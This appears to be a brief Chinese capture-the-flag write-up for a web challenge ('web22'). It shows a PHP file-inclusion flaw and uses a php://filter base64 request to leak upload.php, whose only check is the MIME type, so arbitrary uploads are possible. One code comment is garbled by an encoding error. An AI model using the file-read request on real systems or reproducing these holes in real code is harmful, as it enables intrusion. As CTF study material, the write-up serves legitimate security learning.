# 1、web22

题目显示去upload文件.

先看hello.php代码:

```
<!--upload.php-->
<?php
error_reporting(0);
if(isset($_GET['file'])){
    include $_GET['file'];
  }
?>
```

可以看到有严重的文件包含





查看upload.php代码

GET /hello.php?file=php://filter/read=convert.base64-encode/resource=upload.php

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>UPLOAD</title>
</head>
<body>	
<form action="" enctype="multipart/form-data" method="post" name="upload">
file:
<input type="file" name="file" /><br>
<input type="submit" value="upload" />
</form>
</body>
</html>
<?php
error_reporting(0);
if($_FILES['file']['type'] !== "image/jpeg")  #è¿éå¯¹ä¸ä¼ çæä»¶ç±»åè¿è¡å¤æ­ï¼å¦æä¸æ¯image/gifç±»åä¾¿è¿åéè¯¯ã
        {   
         echo "Sorry, we only allow uploading JPG images";
         exit;
         }
 $uploaddir = 'upload/';
 $uploadfile = $uploaddir . basename($_FILES['file']['name']);
 if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
     {
         echo "File is valid, and was successfully uploaded.\n";
         echo $uploadfile;
        } else {
             echo "File uploading failed.\n";
}
?>



